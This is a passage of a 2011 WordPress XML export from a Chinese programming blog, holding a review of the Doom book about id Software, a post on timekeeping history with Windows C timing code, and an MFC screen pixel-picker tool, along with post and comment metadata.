随着书的讲述，我仿佛置身那个年代，那个《龙与地下城》游戏流行的年代。我就像个看客，看这个故事的主人公卡马克和罗梅洛以及最开始在租的湖畔的房子里一起工作的家伙，一起做游戏。体会他们每个人的感受，哈哈，卡马克程编程方面天才的才华和严肃，罗梅洛天才的设计和搞笑，艾德里安对血腥灰暗画面的热爱，汤姆创意的想法。这样的团队就此组建起来，可能他们在当时还未曾预料，他们几个人，竟书写了在计算机游戏上光辉的历史。或许，也只有富有远见的罗梅洛才能预知一二吧。

罗梅洛和卡马克的互补，曾让他们创造出最好的游戏，创建了id software，可最终，也因两个人的不和而分道扬镳。很清晰的记得，当罗梅洛宣布要做《大刀》时，他在呐喊：“设计确定一切”，在这一点上我挺理解他，作为编写引擎的卡马克，无疑是当时id software的核心。曾在要求制作可伸缩的强，以及杰伊只为卡马克一人买保险，卡马克实际上已成为掌管id的领袖！后来罗梅洛离开了，id 也不再是曾经的id，《大刀》失败了。

无法去详述书中每个细节，甚至概括起来也是十分的无力。按现在游戏分为程序，策划，美术，QA。卡马克无疑是世界顶级游戏引擎程序员，是游戏开发者心中的大神，而罗梅洛也不愧是世界优秀的游戏策划师，是他把引擎的性能榨干(其实罗梅洛还是优秀的程序员，制作游戏编辑工具)，艾德里安也是很不错的美术师。艾德里安身上有一点很可贵，就是他能做他不喜欢的事，并把他做好（他制作基恩时，可爱的角色）。

回想一下，在游戏开发中，程序和美术是游戏策划的支柱，策划的想法需要程序去实现，程序需要美术好的资源！三者只有达成默契，方能发挥最大的工作效率。罗梅洛宣布设计确定一切的时候，他就错了，技术是支柱。而卡马克的技术确实造就了id，也应该放下一个技术人员的偏执（不做Doom3就辞职）。是的，每个人都想做出自己心目中定义的最好的游戏。一个领导者，如何去协调团队中每个成员的想法，求同存异，发挥团队的效率，这才是现代公司应该思考的问题。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>22</wp:post_id>
		<wp:post_date>2011-04-08 22:37:28</wp:post_date>
		<wp:post_date_gmt>2011-04-08 14:37:28</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>doom%e5%90%af%e7%a4%ba%e5%bd%95</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1304747404]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[%e8%af%bbdoom%e5%90%af%e7%a4%ba%e5%bd%95]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[11]]></wp:meta_value>
		</wp:postmeta>
								<wp:comment>
		<wp:comment_id>1</wp:comment_id>
		<wp:comment_author><![CDATA[林子轩]]></wp:comment_author>
		<wp:comment_author_email>zixuanyigu@163.com</wp:comment_author_email>
		<wp:comment_author_url>http://www.zxyg.org</wp:comment_author_url>
		<wp:comment_author_IP>123.154.69.238</wp:comment_author_IP>
		<wp:comment_date>2011-05-07 13:43:45</wp:comment_date>
		<wp:comment_date_gmt>2011-05-07 05:43:45</wp:comment_date_gmt>
		<wp:comment_content><![CDATA[重新贴图试试。]]></wp:comment_content>
		<wp:comment_approved>1</wp:comment_approved>
		<wp:comment_type></wp:comment_type>
		<wp:comment_parent>0</wp:comment_parent>
		<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
				<wp:comment>
		<wp:comment_id>2</wp:comment_id>
		<wp:comment_author><![CDATA[林子轩]]></wp:comment_author>
		<wp:comment_author_email>zixuanyigu@163.com</wp:comment_author_email>
		<wp:comment_author_url>http://www.zxyg.org</wp:comment_author_url>
		<wp:comment_author_IP>123.154.69.238</wp:comment_author_IP>
		<wp:comment_date>2011-05-07 13:44:09</wp:comment_date>
		<wp:comment_date_gmt>2011-05-07 05:44:09</wp:comment_date_gmt>
		<wp:comment_content><![CDATA[这张图片应该没上传好。]]></wp:comment_content>
		<wp:comment_approved>1</wp:comment_approved>
		<wp:comment_type></wp:comment_type>
		<wp:comment_parent>0</wp:comment_parent>
		<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
				<wp:comment>
		<wp:comment_id>3</wp:comment_id>
		<wp:comment_author><![CDATA[codemylife]]></wp:comment_author>
		<wp:comment_author_email>houapple@163.com</wp:comment_author_email>
		<wp:comment_author_url>http://codemylife.blogcn.com</wp:comment_author_url>
		<wp:comment_author_IP>180.168.126.243</wp:comment_author_IP>
		<wp:comment_date>2011-05-07 13:48:59</wp:comment_date>
		<wp:comment_date_gmt>2011-05-07 05:48:59</wp:comment_date_gmt>
		<wp:comment_content><![CDATA[好像是，我重新试试]]></wp:comment_content>
		<wp:comment_approved>1</wp:comment_approved>
		<wp:comment_type></wp:comment_type>
		<wp:comment_parent>2</wp:comment_parent>
		<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
			</item>
		<item>
		<title>漫话时钟</title>
		<link>http://codemylife.blogcn.com/2011/04/%e6%bc%ab%e8%af%9d%e6%97%b6%e9%92%9f/</link>
		<pubDate>Sat, 09 Apr 2011 14:46:31 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[Windows]]></category>

		<category domain="category" nicename="windows"><![CDATA[Windows]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=24</guid>
		<description></description>
		<content:encoded><![CDATA[曾在吃饭时和同事聊到古代如何计时。譬如现在是几更天了，以及古装片中打更的人，是按什么来确定时间的呢？同事们意见不一致，有的说是用一根木棍，测量太阳的影子；有的说利用沙漏；也有的说点一根香，通过燃香来确定时间。ok，让我们问一下google大神！

让我们回到古代，原来古时候把计更的方法是以十二地支的每一个时辰为计时单位。分为：子、丑、寅、卯、辰、巳、午、未、申、酉、戌、亥，每一个时辰相当于现在的两个小时。当然除了打更，还是有晨钟暮鼓等。
<table border="1">
<tbody>
<tr>
<th>时辰名</th>
<th>地支时间</th>
<th>现代时间</th>
<th>时辰名</th>
<th>地支时间</th>
<th>现代时间</th>
</tr>
<tr>
<td>夜半</td>
<td>子时（三更）</td>
<td>23-1</td>
<td>日中</td>
<td>午时</td>
<td>11-13</td>
</tr>
<tr>
<td>鸡鸣</td>
<td>丑时（四更）</td>
<td>1-3</td>
<td>日映</td>
<td>未时</td>
<td>13-15</td>
</tr>
<tr>
<td>平旦</td>
<td>寅时（五更）</td>
<td>3-5</td>
<td>哺时</td>
<td>申时</td>
<td>15-17</td>
</tr>
<tr>
<td>日出</td>
<td>卯时</td>
<td>5-7</td>
<td>日入</td>
<td>酉时</td>
<td>17-19</td>
</tr>
<tr>
<td>食时</td>
<td>辰时</td>
<td>7-9</td>
<td>黄昏</td>
<td>戌时（一更）</td>
<td>19-21</td>
</tr>
<tr>
<td>隅中</td>
<td>巳时</td>
<td>9-11</td>
<td>人定</td>
<td>亥时（二更）</td>
<td>21-23</td>
</tr>
</tbody>
</table>
古时的计时工具有（时间先后）：圭表（类似竿影法），日晷，漏刻，浑仪，天体仪，水运仪像台。

切换回现代，现代的计时工具比古代先进多了，有了机械钟，电钟，石英钟，电波钟，原子钟（目前国际计时用铯原子钟）等。了解了现代计时工具，那现代如何去定义时间呢，我们知道一天24小时，一小时60分，一分60秒。那究竟什么是1秒呢？

1967年第十三届国际计量大会通过新的原子秒的定义：“秒是以铯-l33，原子基态的两个超精细能级间跃迁辐射的9 192 631 770个周期的持续时间。”原子时的时刻起点为l958年1月1日0时。提到了原子时，不得不提世界时。世界时是基于地球自转得出来的：通过天文观测地球自转的周期，可以定出的太阳日被称为视太阳日。将视太阳日均分为86，400等份，每一份便是时间单位“秒”，故而世界时（UT）的秒定义为：1秒等于平太阳日的86 400分之一。由于地球自转得变慢，为了让“原子时”与“世界时”协调一致，就会拨慢原子钟，这就是所谓的“闰秒”，至于为什么地球会变慢，是因为潮汐锁定，详见google。

世界时也即格林威治时间。中国横跨东五、 东六、 东七、东八和东九5个时区。采用首都北京所在的东八时区的区时，为标准时间也叫北京时间。故北京时间比格林威治早8小时。比如说某事件发生在格林威治时间上午8 时，那么相当于发生在北京时间16时。也即格林威治时间比北京时间慢8小时。太阳从我们这里升起往英国格林尼治那边运动，所以如果你身处跨国公司，一般白天处理好文件传给外国时，你睡觉的时候他们正开始起来办公，效率是不是蛮高的。:)

初步了解了计时的历史后（关于时间起源，还有很多知识等待你去探索），接下来让我们进入本文的主题：计算机的时间。进入主题之前，复习一下概念。

频率：广义上指单位时间内某事件重复发生的次数，物理学上指物质在1秒内完成周期性变化的次数。频率单位是赫兹（Hz），简称赫，也常用千赫（kHz）或兆赫（MHz）或GHz做单位。赫兹是为了纪念德国物理学家Heinrich Rudolf Hertz于1888年证明电磁波的存在。时钟频率（clock rate）是指同步电路中时钟的基础频率，CPU的时钟频率通常是由晶体振荡器的频率决定的。

周期：物体作往复运动或物理量作周而复始的变化时，重复一次所经历的时间。时钟周期也称为振荡周期，定义为时钟频率的倒数：T= 1/f。对于1GHz的CPU而言，时钟周期为1ns(10<sup>-9</sup>s)。

windows下时间相关：
<ol>
	<li>Sleep：精度很低，用于不精确的延时，多线程中可能会看到sleep(0)，其主要目的是让出时间片。</li>
	<li>C语言Time()：主要用于获取系统时间，精度s</li>
	<li>C语言clock()：获取系统启动后时间间隔，精度ms</li>
	<li>GetTickCount()：获取系统启动后时间间隔，精度10ms</li>
	<li>timeGetTime()：需要包含Mmsystem.h，Windows.h，静态库Winmm.lib，精度ms</li>
	<li>QueryPerformanceFrequency，QueryPerformanceCounter：需要硬件支持，精度us，建议先使用SetThreadAffinityMask设置线程运行在哪个核上</li>
	<li>RDTSC。读取时间戳指令(Read Time Stamp Counter)</li>
</ol>
一些例子程序：
使用timeGetTime
[code=c]
DWORD tStart, tEnd;
tStart = timeGetTime();
Sleep(1000);
tEnd = timeGetTime();
printf("tStart:%u, tEnd:%u, elapsedTime:%u", tStart, tEnd
, tEnd - tStart);
[/code]
使用QueryPerformanceCounter
[code=c]
SetThreadAffinityMask(GetCurrentThread(), 1);

LARGE_INTEGER tStart, tEnd, tCount;
QueryPerformanceFrequency(&amp;tCount);
printf("Frequency: %u\n", tCount.QuadPart);

QueryPerformanceCounter(&amp;tStart);
Sleep(1000);
QueryPerformanceCounter(&amp;tEnd);

printf("tStart.QuadPart:%I64u, tEnd.QuadPart:%I64u, tEnd-tStart:%I64u",
tStart.QuadPart, tEnd.QuadPart, tEnd.QuadPart - tStart.QuadPart);

printf("\nelapsedTime:%f",(double)(tEnd.QuadPart - tStart.QuadPart) / tCount.QuadPart);
[/code]
高精度延时程序(!= 改成&lt;=)
<pre class="c">void DelayUs(__int64 Us)
{
    LARGE_INTEGER CurrTicks, TicksCount; 
    QueryPerformanceFrequency(&TicksCount);
    QueryPerformanceCounter(&CurrTicks); 
    TicksCount.QuadPart = TicksCount.QuadPart * Us / 1000000i64;
    TicksCount.QuadPart += CurrTicks.QuadPart; 
    while(CurrTicks.QuadPart !=TicksCount.QuadPart)
        QueryPerformanceCounter(&CurrTicks);
}</pre>

通过注册表读取cpu频率
<pre class="c">BOOL ReadDwordKey(IN HKEY hRootKey,IN LPCTSTR lpSubKey,
			IN LPCTSTR lpKey,OUT DWORD* dwValue)
{
    HKEY hk;
    if (ERROR_SUCCESS!=RegOpenKey(hRootKey,lpSubKey,&amp;hk))
        return FALSE;
    DWORD dwType=REG_DWORD,dwLength=sizeof(DWORD);
    if (ERROR_SUCCESS!=RegQueryValueEx(hk,lpKey,NULL,&amp;dwType,
(LPBYTE)dwValue,&amp;dwLength))
        return FALSE;
    if (dwType!=REG_DWORD)
        return FALSE;
    return TRUE;
}
int main()
{
    DWORD dwCpuFrequency = 0;
    ReadDwordKey(HKEY_LOCAL_MACHINE,"HARDWARE\\DESCRIPTION\\System
\\CentralProcessor\\0","~MHz",&amp;dwCpuFrequency);
    printf("%u",dwCpuFrequency);
    return 0;
}</pre>
时钟循环与高精度计数器计算获取cpu频率(!=改成&lt;)
<pre class="c">float ProcSpeedCalc()
{
/*
RdTSC:
It's the Pentium instruction "ReaD Time Stamp Counter". It measures 
thenumber of clock cycles that have passed since the processor was
reset, as a64-bit number. That's what the _emit lines do.*/
    #define RdTSC __asm _emit 0x0f __asm _emit 0x31
    // variables for the clock-cycles:
    __int64 cyclesStart = 0, cyclesStop = 0;
    // variables for the High-Res Preformance Counter:
    unsigned __int64 nCtr = 0, nFreq = 0, nCtrStop = 0;
    // ret performance-counter frequency per second:
    if(!QueryPerformanceFrequency((LARGE_INTEGER *) &nFreq)) 
        return 0;
    // ret the current value of the performance counter:
    QueryPerformanceCounter((LARGE_INTEGER *) &nCtrStop);
    // add the frequency to the counter-value:
    nCtrStop += nFreq;
    __asm
    {// ret the clock-cycles for the start value:
        RdTSC
        mov DWORD PTR cyclesStart, eax
        mov DWORD PTR [cyclesStart + 4], edx
    }
    // ret the value of counter until 1 sec has gone by:
    do{
         QueryPerformanceCounter((LARGE_INTEGER *) &nCtr);
    }while (nCtr != nCtrStop);
    __asm
    {// ret again the clock-cycles after 1 sec. has gone by:
        RdTSC
        mov DWORD PTR cyclesStop, eax
        mov DWORD PTR [cyclesStop + 4], edx
    }
// stop-start is speed in Hz divided by 1,000,000 is speed in MHz
return    ((float)cyclesStop-(float)cyclesStart) / 1000000;
}</pre>
Over~~~
一些参考资料：
<a href="http://amuseum.cdstm.cn/AMuseum/time/index.html">时间科普网</a>
<a href="http://www.cppfans.com/articles/system/cpuspd_usdly.asp">c++爱好者</a>
<a href="http://www.codeproject.com/KB/system/Processor_Speed.aspx">Get the Processor Speed in two simple ways</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>24</wp:post_id>
		<wp:post_date>2011-04-09 22:46:31</wp:post_date>
		<wp:post_date_gmt>2011-04-09 14:46:31</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e6%bc%ab%e8%af%9d%e6%97%b6%e9%92%9f</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359298]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>keywords</wp:meta_key>
		<wp:meta_value><![CDATA[漫话时钟]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>title</wp:meta_key>
		<wp:meta_value><![CDATA[漫话时钟]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[8]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>屏幕取点工具</title>
		<link>http://codemylife.blogcn.com/2011/05/%e5%b1%8f%e5%b9%95%e5%8f%96%e7%82%b9%e5%b7%a5%e5%85%b7/</link>
		<pubDate>Fri, 06 May 2011 10:41:31 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[MFC]]></category>

		<category domain="category" nicename="mfc"><![CDATA[MFC]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=25</guid>
		<description></description>
		<content:encoded><![CDATA[这两天很闲，在捣鼓一个自动玩《蒙特祖玛的宝藏》的东东，需要屏幕取点，所以用mfc顺手写了一个取点的工具。发觉mfc还是很有用啊！记录一下：

CGetWindowPixelDlg类成员
[code="c"]
afx_msg void OnTimer(UINT_PTR nIDEvent);
void GetInputPoint();
void GetColorOnPoint(RECT&amp; rect);
CString m_strWindowTitle;
CString m_strPoint;
CString m_strPixelInfo;
POINT m_Point;
[/code]
在BOOL CGetWindowPixelDlg::OnInitDialog()中设置timer：SetTimer(1, 1000, NULL)。响应Timer函数：
<pre class="c">void CGetWindowPixelDlg::OnTimer(UINT_PTR nIDEvent)
{
    // TODO: 在此添加消息处理程序代码和/或调用默认值
    UpdateData(TRUE);
    HWND hDestWnd;
    if (m_strWindowTitle.IsEmpty())
	hDestWnd = ::GetDesktopWindow();	// 为空则为桌面取点
    else
	hDestWnd = ::FindWindow(NULL, m_strWindowTitle.GetBuffer());
    //获取输入坐标
    GetInputPoint();
    RECT rect;
    ::GetWindowRect(hDestWnd, &amp;rect);
    //获取像素颜色并显示
    GetColorOnPoint(rect);
    CDialogEx::OnTimer(nIDEvent);
}</pre>
GetInputPoint()函数获取输入的坐标：
<pre class="c">void CGetWindowPixelDlg::GetInputPoint()
{
    if (m_strPoint.IsEmpty()) {
        GetCursorPos(&amp;m_Point);	//为空则为鼠标当前位置
    }
    else {
        char Pos[2][64];		//	x, y
        memset(Pos, 0, sizeof(Pos));
        const char *p = m_strPoint.GetBuffer();
        const char *pStart = p, *pEnd = p;
        int index = 0;
        for (int i = 0; i &lt;= m_strPoint.GetLength(); i++, p++)
        {
            if (*p == ' ' || *p == ',' || *p == '\0') {
                pEnd = p;
                int n = pEnd - pStart + 1;
                strncpy(Pos[index], pStart, n);
                Pos[index][n-1] = 0;
                index++;
                if (*p != '\0')
                pStart = p + 1;
            }
        }
        m_Point.x = atoi(Pos[0]);
        m_Point.y = atoi(Pos[1]);
    }
}</pre>
计算颜色
<pre class="c">void CGetWindowPixelDlg::GetColorOnPoint(RECT&amp; rect)
{
    POINT pt;
    pt.x = m_Point.x + rect.left;
    pt.y = m_Point.y + rect.top;
    char szPixelInfo[1024] = {0};
    char szTemp[64] = {0};
    DWORD RValue[10], GValue[10], BValue[10], AverValue[3] = {0,0,0};
    //获取桌面hdc
    HWND hwnd = ::GetDesktopWindow();
    HDC hdc = ::GetWindowDC(hwnd);
    //以当前点为九宫格中心，取九个点计算均值
    for (int i = 1, xOffset = -1, yOffset = -1; i &lt;= 9; i++)
    {
        POINT ptTemp;
        ptTemp.x = pt.x + xOffset;
        ptTemp.y = pt.y + yOffset;
        //计算颜色
        COLORREF clr = GetPixel(hdc, ptTemp.x, ptTemp.y);
        RValue[i] = GetRValue(clr);
        GValue[i] = GetGValue(clr);
        BValue[i] = GetBValue(clr);
        AverValue[0] += RValue[i];
        AverValue[1] += GValue[i];
        AverValue[2] += BValue[i];
        //打印日志
        if (i == 5)
            strcat(szPixelInfo, "\r\n");
	_snprintf(szTemp, sizeof(szTemp), "%d,%d\t(%d, %d, %d)\r\n"
		,ptTemp.x, ptTemp.y,RValue[i], GValue[i], BValue[i]);
	strcat(szPixelInfo, szTemp);
	memset(szTemp, 0, sizeof(szTemp));
	if (i == 5)
	    strcat(szPixelInfo, "\r\n");
	//偏移处理
	if (i % 3 == 0) {
	    xOffset = -1;
	    yOffset++;
	}
	else {
	    xOffset++;
	}
    }
    _snprintf(szTemp, sizeof(szTemp), "\r\n平均值\t(%d, %d, %d)",
	AverValue[0] / 9, AverValue[1] / 9, AverValue[2] / 9);
    strcat(szPixelInfo, szTemp);
    //显示信息
    m_strPixelInfo = szPixelInfo;
    UpdateData(FALSE);
    //释放句柄
    ::ReleaseDC(hwnd, hdc);
}</pre>
最后在DoDataExchange函数中要加入下面的语句：
DDX_Text(pDX, IDC_EditPos, m_strPoint);
DDX_Text(pDX, IDC_EditInfo, m_strWindowTitle);
DDX_Text(pDX, IDC_EditPrint, m_strPixelInfo);
Over。手动调代码格式真是痛苦哇~~~
<img class="alignleft" style="float: left;" src="http://files.blogcn.com/wp05/M00/00/53/wKgKDE3E2wAAAAAAAAB-NWkIEa0007.jpg" alt="" width="287" height="356" />]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>25</wp:post_id>
		<wp:post_date>2011-05-06 18:41:31</wp:post_date>
		<wp:post_date_gmt>2011-05-06 10:41:31</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e5%b1%8f%e5%b9%95%e5%8f%96%e7%82%b9%e5%b7%a5%e5%85%b7</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1310906818]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[13]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>屏幕取点</title>
		<link>http://codemylife.blogcn.com/2011/05/%e5%b1%8f%e5%b9%95%e5%8f%96%e7%82%b9%e5%b7%a5%e5%85%b7/%e5%b1%8f%e5%b9%95%e5%8f%96%e7%82%b9/</link>
		<pubDate>Sat, 07 May 2011 05:39:12 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp05/M00/00/53/wKgKDE3E2wAAAAAAAAB-NWkIEa0007.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>29</wp:post_id>
		<wp:post_date>2011-05-07 13:39:12</wp:post_date>
		<wp:post_date_gmt>2011-05-07 05:39:12</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e5%b1%8f%e5%b9%95%e5%8f%96%e7%82%b9</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>25</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp05/M00/00/53/wKgKDE3E2wAAAAAAAAB-NWkIEa0007.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"287";s:6:"height";s:3:"356";s:14:"hwstring_small";s:22:"height='96' width='77'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/00/2F/wKgKDU3E2wAAAAAAAAANK1iLpdk394.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"151";s:6:"height";s:3:"188";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/00/77/wKgKCk3E2wAAAAAAAAAnlFMBQyg303.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/00/77/wKgKCk3E2wAAAAAAAAB-NQLzTtE387.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>doom启示录</title>
		<link>http://codemylife.blogcn.com/2011/04/doom%e5%90%af%e7%a4%ba%e5%bd%95/doom%e5%90%af%e7%a4%ba%e5%bd%95-2/</link>
		<pubDate>Sat, 07 May 2011 05:46:17 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp01/M00/00/2E/wKgKC03E3KkAAAAAAABBaUPJDhk125.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>31</wp:post_id>
		<wp:post_date>2011-05-07 13:46:17</wp:post_date>
		<wp:post_date_gmt>2011-05-07 05:46:17</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>doom%e5%90%af%e7%a4%ba%e5%bd%95-2</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>22</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp01/M00/00/2E/wKgKC03E3KkAAAAAAABBaUPJDhk125.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
